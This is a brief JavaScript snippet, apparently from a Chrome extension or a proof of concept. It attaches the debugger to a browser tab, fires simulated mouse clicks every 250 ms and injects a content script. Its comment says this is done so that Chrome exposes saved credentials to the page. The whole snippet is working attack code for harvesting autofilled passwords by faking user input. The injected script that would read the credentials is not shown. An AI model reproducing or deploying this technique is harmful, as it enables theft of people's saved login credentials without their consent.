const tabId = 2;

// Simulate a mouse click so chrome will make
// the credentials accessible to the DOM.
chrome.debugger.attach({ tabId }, "1.2", function () {
    const commandParams = { type: "mousePressed", x: 1, y: 1, button: "left" };

    setInterval(function () {
        chrome.debugger.sendCommand({ tabId }, "Input.dispatchMouseEvent", commandParams);
        chrome.debugger.sendCommand({ tabId }, "Input.dispatchMouseEvent", commandParams);
    }, 250);

    chrome.tabs.executeScript(tabId, { file: "content-script.js" });
});